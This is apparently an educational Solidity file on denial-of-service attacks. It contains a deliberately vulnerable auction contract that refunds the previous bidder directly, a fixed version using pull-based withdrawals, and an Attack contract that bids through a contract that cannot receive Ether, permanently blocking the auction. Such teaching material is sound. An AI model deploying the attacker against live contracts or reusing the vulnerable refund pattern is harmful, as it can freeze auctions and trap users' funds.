//What is a DOS attack? ====> It's an attack disable the service

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint256 public currentAuctionPrice;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(
            msg.value > currentAuctionPrice,
            "Need to pay more than the currentAuctionPrice"
        );
        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
        if (sent) {
            currentAuctionPrice = msg.value;
            currentWinner = msg.sender;
        }
    }
}

//Best contract prevent from dos
contract Best {
    address public currentWinner;
    uint256 public currentAuctionPrice;
    mapping(address => uint256) public balances;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(
            msg.value > currentAuctionPrice,
            "Need to pay more than the currentAuctionPrice"
        );
        balances[currentWinner] += currentAuctionPrice;
        currentAuctionPrice = msg.value;
        currentWinner = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != currentWinner, "Current winner cannot withdraw");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
